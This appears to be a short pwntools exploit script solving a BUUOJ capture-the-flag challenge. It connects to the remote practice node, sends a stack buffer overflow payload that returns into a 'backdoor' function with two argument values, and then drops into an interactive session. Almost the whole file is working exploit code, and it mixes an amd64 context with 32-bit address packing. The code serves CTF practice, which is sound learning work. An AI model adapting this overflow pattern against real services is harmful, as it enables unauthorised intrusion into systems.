from pwn import * 
from pwn import p32


debug = 0
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "node4.buuoj.cn"
    r = connect(host,29861)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x8048A19')
    # gdb.attach(r)
    pause()
    pass

# libc = ELF('./libc-2.31.so')
# elf = ELF('./vuln')

payload = b'A' * 0x38 + p32(0x80489A0) + p32(0x804e6a0) + p32(0x308cd64f) + p32(0x195719d1)
                            #backdoor       #exit               #a               #b
r.sendline(payload)
# r.send()
# r.recvuntil()
r.interactive()
